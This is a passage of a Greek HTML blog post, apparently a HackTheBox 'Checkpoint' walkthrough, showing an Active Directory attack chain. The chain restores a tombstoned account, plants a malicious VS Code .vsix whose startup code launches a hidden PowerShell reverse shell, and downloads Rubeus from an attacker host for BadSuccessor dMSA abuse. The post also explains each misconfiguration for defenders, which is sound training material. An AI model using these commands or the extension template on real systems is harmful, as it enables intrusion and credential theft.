@@ -1,0 +1,778 @@
+<!DOCTYPE html>
+<html lang="el">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Checkpoint — S. Markakis</title>
+<meta name="description" content="HackTheBox Checkpoint — αναζωογόνηση tombstone Active Directory, ένα κακόβουλο extension VS Code .vsix για RCE, το privilege escalation Server 2025 BadSuccessor dMSA, και το dumping ενός hash domain admin από ένα memory snapshot VMware με volatility3.">
+<meta property="og:title" content="HTB: Checkpoint — S. Markakis">
+<meta property="og:description" content="HackTheBox Checkpoint — αναζωογόνηση tombstone Active Directory, ένα κακόβουλο extension VS Code .vsix για RCE, το privilege escalation Server 2025 BadSuccessor dMSA, και το dumping ενός hash domain admin από ένα memory snapshot VMware με volatility3.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-checkpoint-el.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-checkpoint.png">
+<meta property="og:locale" content="el_GR">
+<meta property="og:locale:alternate" content="en_US">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-checkpoint.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-checkpoint-el.html">
+<link rel="alternate" hreflang="en" href="https://s-markakis.github.io/writeups/htb-checkpoint.html">
+<link rel="alternate" hreflang="el" href="https://s-markakis.github.io/writeups/htb-checkpoint-el.html">
+<link rel="alternate" hreflang="x-default" href="https://s-markakis.github.io/writeups/htb-checkpoint.html">
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-win  { background: #c0ccd8; color: #24384a; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.72rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p { color: var(--text); margin-bottom: 1rem; }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.6rem auto;
+    display: block;
+  }
+  picture { display: block; }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<style>
+  .htb-cta{display:flex;gap:.6rem;flex-wrap:wrap;margin:1.5rem 0}
+  .htb-cta.top{margin-top:.4rem}
+  .htb-cta a{flex:1 1 220px;display:flex;align-items:center;gap:.75rem;padding:.75rem .9rem;background:var(--bg-code);border:1px solid var(--border);border-radius:8px;text-decoration:none;color:var(--text-dark);font-family:'Barlow',sans-serif;transition:transform .15s,border-color .15s,background .15s}
+  .htb-cta a:hover{transform:translateY(-2px);border-color:var(--text-dark);background:var(--bg-term)}
+  .htb-cta svg{width:20px;height:20px;flex:none;stroke:var(--text-dark);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .htb-cta .l-t{display:block;font-family:'Barlow Condensed',sans-serif;font-weight:600;font-size:1.02rem;letter-spacing:.01em;line-height:1.15;color:var(--text-dark)}
+  .htb-cta .l-s{display:block;font-size:.72rem;color:var(--text-mid);line-height:1.25}
+  .htb-cta .l-x{margin-left:auto;color:var(--text-mid);font-size:.95rem}
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Checkpoint",
+  "description": "HackTheBox Checkpoint — αναζωογόνηση tombstone Active Directory, ένα κακόβουλο extension VS Code .vsix για RCE, το privilege escalation Server 2025 BadSuccessor dMSA, και το dumping ενός hash domain admin από ένα memory snapshot VMware με volatility3.",
+  "datePublished": "2026-09-09",
+  "dateModified": "2026-09-09",
+  "inLanguage": "el",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-checkpoint-el.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-checkpoint.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-checkpoint"
+  },
+  "timeRequired": "PT10M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Πίσω στο blog</a>
+
+<div class="wrapper">
+
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Πίσω στα posts</a>
+  <p style="font-size:.8rem;letter-spacing:.04em;color:var(--text-mid);margin-bottom:1.2rem;"><a href="htb-checkpoint.html" style="font-weight:600;">English</a> &nbsp;·&nbsp; <strong style="color:var(--text-dark);">Ελληνικά</strong></p>
+
+  <div class="post-header">
+    <h1>HTB: Checkpoint</h1>
+    <div class="post-meta">
+      <span class="date">9 Σεπτεμβρίου 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-win">Active Directory</span>
+      <span class="tag">Windows Server 2025</span>
+      <span>&nbsp;12 λεπτά αναγνωσης</span>
+    </div>
+  </div>
+
+  <div class="htb-cta top">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">Το προφίλ μου στο HTB &amp; περισσότερα boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Εργαλεία security &amp; automation ανοιχτού κώδικα</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+
+  <hr class="divider">
+
+  <div class="overview">
+    Το Checkpoint είναι μια καθαρή αλυσίδα Active Directory χωρίς κανένα εκμεταλλεύσιμο CVE πουθενά μέσα της — κάθε βήμα είναι μια λάθος ρύθμιση που παραδίδει στο επόμενο. Ανοίγει σε ένα αντικείμενο που κανείς δεν θα έπρεπε να μπορεί να αγγίξει: έναν <strong>tombstoned</strong> (soft-deleted) χρήστη που ο αρχικός μας λογαριασμός μπορεί να <em>αναζωογονήσει</em>. Από εκεί περνάει μέσα από ένα <strong>κακόβουλο extension VS Code <code>.vsix</code></strong> για εκτέλεση κώδικα, την ολοκαίνουρια κατάχρηση delegated-Managed-Service-Account <strong>BadSuccessor</strong> σε Server 2025, και τελειώνει κάπου ασυνήθιστο — τραβώντας το hash ενός domain administrator από ένα <strong>memory snapshot VMware</strong> που κάθεται σε ένα backup share, με volatility3. Είναι μια φοβερή περιήγηση στο "living off AD features" αντί για εκμετάλλευση bugs.
+  </div>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-checkpoint/img-attack-chain.webp" type="image/webp"><img class="screenshot" src="assets/htb-checkpoint/img-attack-chain.png" alt="Checkpoint domain-compromise chain: alex.turner restores tombstoned Mark Davies, mark.davies drops a malicious VS Code vsix into DevDrop for a ryan.brooks shell and user.txt, BadSuccessor dMSA yields svc_deploy keys, svc_deploy reads a VMBackups vmem, volatility3 plus secretsdump recovers the Administrator hash, and pass-the-hash to DC01 gives root.txt" width="1540" height="784" loading="lazy" decoding="async"></picture>
+
+  <div class="chain">
+    <span class="chain-node">alex.turner</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">restore tombstone</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">mark.davies</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">malicious .vsix</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">ryan.brooks</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">BadSuccessor dMSA</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">svc_deploy</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">VMBackups .vmem</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">volatility3 + secretsdump</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">Administrator</span>
+  </div>
+
+  <div class="alert alert-info">Το box επιτιθέμενου εδώ είναι <strong>macOS</strong>, όχι Kali — αξίζει να το αναφέρω γιατί αναγκάζει δύο workarounds αργότερα: το tooling Windows AD τρέχει από venvs <code>pipx</code>, και το clock-skew του Kerberos δεν μπορεί να διορθωθεί με <code>ntpdate</code> χωρίς να αγγίξω το ρολόι συστήματος. Και τα δύο λύνονται inline παρακάτω.</div>
+
+  <!-- ══ RECON ══ -->
+  <h2>Αναγνώριση</h2>
+
+  <p>Μια πλήρης σάρωση TCP δείχνει την τυπική επιφάνεια domain-controller — το box ανακοινώνει τον εαυτό του ως <code>DC01</code> στο <code>checkpoint.htb</code>, Windows Server 2025 (build 26100).</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">αναγνώριση</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nmap -sC -sV -p- --min-rate 5000 &lt;TARGET_IP&gt;</span>
+<span class="po">53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
+445/tcp   open  microsoft-ds
+5985/tcp  open  http          Microsoft HTTPAPI (WinRM)
+...</span>
+<span class="pd">$ </span><span class="pc">echo '&lt;TARGET_IP&gt; checkpoint.htb dc01.checkpoint.htb dc01' | sudo tee -a /etc/hosts</span></div>
+  </div>
+
+  <p>Το box σου δίνει ένα αρχικό credential: <code>alex.turner : Checkpoint2024!</code>. Κάνει authenticate, οπότε πάμε κατευθείαν σε καταμέτρηση αντικειμένων.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nxc smb — έγκυρα creds</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nxc smb checkpoint.htb -u alex.turner -p 'Checkpoint2024!'</span>
+<span class="po">SMB  DC01  [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb)
+SMB  DC01  </span><span class="pg">[+] checkpoint.htb\alex.turner:Checkpoint2024!</span></div>
+  </div>
+
+  <!-- ══ TOMBSTONE ══ -->
+  <h2>Αρχική Πρόσβαση — Αναζωογόνηση Tombstone</h2>
+
+  <p>Όταν ένα αντικείμενο AD διαγράφεται δεν εξαφανίζεται αμέσως — γίνεται ένα <strong>tombstone</strong>: γυμνωμένο από τα περισσότερα attributes και μετακινημένο στο <code>CN=Deleted Objects</code>, όπου παραμένει για τη διάρκεια ζωής tombstone (180 μέρες by default) πριν το garbage collector το θερίσει. Αν μπορείς να <em>γράψεις</em> σε ένα tombstone, μπορείς να καθαρίσεις τη σημαία <code>isDeleted</code> του και να ορίσεις νέο <code>distinguishedName</code> — <strong>επαναφέροντάς</strong> το, attributes και όλα. Το <code>get writable</code> του bloodyAD δείχνει ότι ο alex.turner έχει ακριβώς εκείνο το δικαίωμα:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">bloodyAD get writable</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host &lt;TARGET_IP&gt; get writable</span>
+
+<span class="po">distinguishedName: </span><span class="py">CN=Deleted Objects,DC=checkpoint,DC=htb</span><span class="po">
+DACL: WRITE
+
+distinguishedName: </span><span class="py">CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,...</span><span class="po">
+permission: WRITE</span></div>
+  </div>
+
+  <p>Να το tombstone: ένας διαγραμμένος <strong>Mark Davies</strong> που μπορούμε να γράψουμε. Επανάφερέ τον σε μία κλήση:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">bloodyAD set restore</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host &lt;TARGET_IP&gt; \
+     set restore "CN=Mark Davies\0ADEL:2217e877-...,CN=Deleted Objects,DC=checkpoint,DC=htb"</span>
+<span class="pg">[+] CN=Mark Davies\0ADEL:2217e877-... has been restored successfully under
+    CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb</span></div>
+  </div>
+
+  <p>Ένας επαναφερμένος λογαριασμός κρατά το παλιό του password. Ο Mark μοιραζόταν το default του domain, και μπορεί να δει ένα ακόμα share από όσα μπορούσε ο alex:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nxc smb mark.davies --shares</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nxc smb checkpoint.htb -u mark.davies -p 'Checkpoint2024!' --shares</span>
+<span class="pg">[+] checkpoint.htb\mark.davies:Checkpoint2024!</span><span class="po">
+Share      Permissions   Remark
+-----      -----------   ------
+</span><span class="py">DevDrop    READ,WRITE    VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0</span><span class="po">
+VMBackups                (no access yet)</span></div>
+  </div>
+
+  <div class="alert alert-warn">Ένα εγγράψιμο tombstone είναι μια λάθος ρύθμιση DACL στο <code>CN=Deleted Objects</code>. Τα δικαιώματα επαναφοράς θα έπρεπε να περιορίζονται σε μια ομάδα break-glass admin· το να τα δίνεις σε έναν κανονικό χρήστη μετατρέπει το "διαγράψαμε εκείνον τον λογαριασμό" σε "τον ξαναζωντανέψαμε, με το παλιό του password."</div>
+
+  <!-- ══ VSIX RCE ══ -->
+  <h2>Foothold — Κακόβουλο Extension VS Code</h2>
+
+  <p>Το ίδιο το remark του share <code>DevDrop</code> λέει την ιστορία: είναι ένας φάκελος drop για "εγκεκριμένα" extensions VS Code, engine <strong>1.118.0</strong>. Κάτι στο box εγκαθιστά πακέτα <code>.vsix</code> που αφήνονται εδώ. Ένα extension VS Code είναι απλά ένα zip με ένα manifest και ένα entry point JavaScript, και το entry point τρέχει αυθαίρετο Node στο activation — οπότε ένα κακόβουλο extension είναι τετριμμένο RCE ενάντια σε όποιον το φορτώνει.</p>
+
+  <p>Το πακέτο είναι τέσσερα αρχεία: <code>[Content_Types].xml</code>, <code>extension.vsixmanifest</code>, και ένας φάκελος <code>extension/</code> με <code>package.json</code> + <code>extension.js</code>. Το manifest δηλώνει το ταιριαστό engine· το <code>package.json</code> κάνει activate στο startup και δείχνει στον κώδικά μας· το <code>extension.js</code> γεννά ένα reverse shell:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">extension/package.json + extension.js</span>
+    </div>
+    <div class="term-body"><span class="po">// package.json
+"engines": { "vscode": "^1.118.0" },
+"activationEvents": ["onStartupFinished"],
+"main": "./extension.js"
+
+// extension.js — runs the moment the editor finishes loading
+const cp = require('child_process');
+function activate() {
+  cp.exec('powershell -nop -w hidden -e &lt;base64 reverse shell&gt;');
+}
+module.exports = { activate, deactivate: () =&gt; {} };</span></div>
+  </div>
+
+  <p>Κάν' το zip σε ένα <code>.vsix</code>, ξεκίνα έναν listener, και ρίξ' το στο share με την πρόσβαση εγγραφής του mark.davies:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">πακετάρισμα &amp; παράδοση</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">zip -r exploit.vsix "[Content_Types].xml" extension.vsixmanifest extension/</span>
+<span class="pd">$ </span><span class="pc">ncat -lvnp 4444        </span><span class="pco"># listener</span>
+<span class="pd">$ </span><span class="pc">smbclient //checkpoint.htb/DevDrop -U 'checkpoint.htb\mark.davies%Checkpoint2024!' \
+     -c 'put exploit.vsix exploit.vsix'</span></div>
+  </div>
+
+  <p>Ένα λεπτό αργότερα ο editor του προσομοιωμένου operator φορτώνει το extension και καλεί πίσω — σαν <strong>ryan.brooks</strong>, στο ίδιο το DC01:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">reverse shell</span>
+    </div>
+    <div class="term-body"><span class="po">Ncat: Connection from &lt;TARGET_IP&gt;.
+</span><span class="pd">PS C:\Program Files\Microsoft VS Code&gt; </span><span class="pc">whoami; hostname</span><span class="po">
+checkpoint\ryan.brooks
+DC01</span>
+<span class="pd">PS ...&gt; </span><span class="pc">type C:\Users\ryan.brooks\Desktop\user.txt</span><span class="po">
+</span><span class="pg">[redacted — user flag]</span></div>
+  </div>
+
+  <div class="alert alert-info">Το auto-installing "εγκεκριμένων" extensions από ένα εγγράψιμο share είναι όλο το bug — το trust boundary είναι το ACL του share, και είναι ορισμένο σε READ/WRITE για έναν επαναφέρσιμο λογαριασμό. Τα extensions είναι κώδικας· ένα share που μπορείς να γράψεις και τροφοδοτεί έναν editor είναι ένα primitive code-execution.</div>
+
+  <!-- ══ BADSUCCESSOR ══ -->
+  <h2>Privilege Escalation — BadSuccessor (κατάχρηση dMSA)</h2>
+
+  <p>Το <strong>BadSuccessor</strong> είναι μια τεχνική Server-2025 του 2025 (του Yuval Gordon της Akamai) που κάνει κατάχρηση <strong>delegated Managed Service Accounts</strong>. Τα dMSAs προορίζονταν να αντικαταστήσουν legacy service accounts: συνδέεις ένα νέο dMSA με τον προκάτοχό του μέσω <code>msDS-ManagedAccountPrecededByLink</code>, σημαίνεις τη μετάβαση ολοκληρωμένη, και το KDC αφήνει το dMSA να κάνει authenticate <em>με τα κλειδιά του προκατόχου</em> ώστε τίποτα να μη σπάσει κατά τη μετάβαση. Η παγίδα: αν μπορείς να δημιουργήσεις ένα dMSA σε ένα OU που ελέγχεις, μπορείς να δείξεις εκείνο το link σε <em>οποιονδήποτε</em> λογαριασμό και το KDC θα σου δώσει τα κλειδιά του. Το module του netexec επιβεβαιώνει ότι ο ryan.brooks είναι έγκυρος principal για αυτό:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nxc ldap -M badsuccessor</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nxc ldap checkpoint.htb -u alex.turner -p 'Checkpoint2024!' -M badsuccessor</span>
+<span class="po">BADSUCCESSOR  [+] ryan.brooks (S-1-5-...-1103), </span><span class="py">OU=DMSAHolder,DC=checkpoint,DC=htb</span></div>
+  </div>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-checkpoint/img-badsuccessor.webp" type="image/webp"><img class="screenshot" src="assets/htb-checkpoint/img-badsuccessor.png" alt="BadSuccessor dMSA migration abuse: ryan.brooks with CREATE_CHILD on OU=DMSAHolder uses Rubeus tgtdeleg for a TGT then bloodyAD add badSuccessor to forge evilDMSA6 linked as the successor of svc_deploy, and the KDC packs svc_deploy's AES and RC4 keys into the returned TGS" width="1568" height="662" loading="lazy" decoding="async"></picture>
+
+  <h3>Αποκτώντας ένα ticket χωρίς password</h3>
+
+  <p>Το <code>badSuccessor</code> του bloodyAD χρειάζεται να κάνει authenticate σαν ryan.brooks — αλλά έχουμε μόνο ένα shell, όχι το password ή το hash του. Το <strong>Rubeus <code>tgtdeleg</code></strong> το λύνει αυτό: κάνει κατάχρηση του Kerberos GSS-API delegation ώστε να κάνει το τοπικό session να παραδώσει ένα χρησιμοποιήσιμο TGT για τον τρέχοντα χρήστη, χωρίς να απαιτούνται secrets. Φιλοξενούμε το Rubeus μέσω HTTP, το τραβάμε μέσα στο shell, και το τρέχουμε:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">Rubeus tgtdeleg (μέσα στο shell του ryan.brooks)</span>
+    </div>
+    <div class="term-body"><span class="pd">PS ...&gt; </span><span class="pc">iwr http://&lt;LHOST&gt;:8181/rubeus.exe -OutFile C:\Windows\Temp\rubeus.exe</span>
+<span class="pd">PS ...&gt; </span><span class="pc">C:\Windows\Temp\rubeus.exe tgtdeleg /nowrap</span>
+<span class="po">[+] Delegation request success!
+[*] base64(ticket.kirbi):
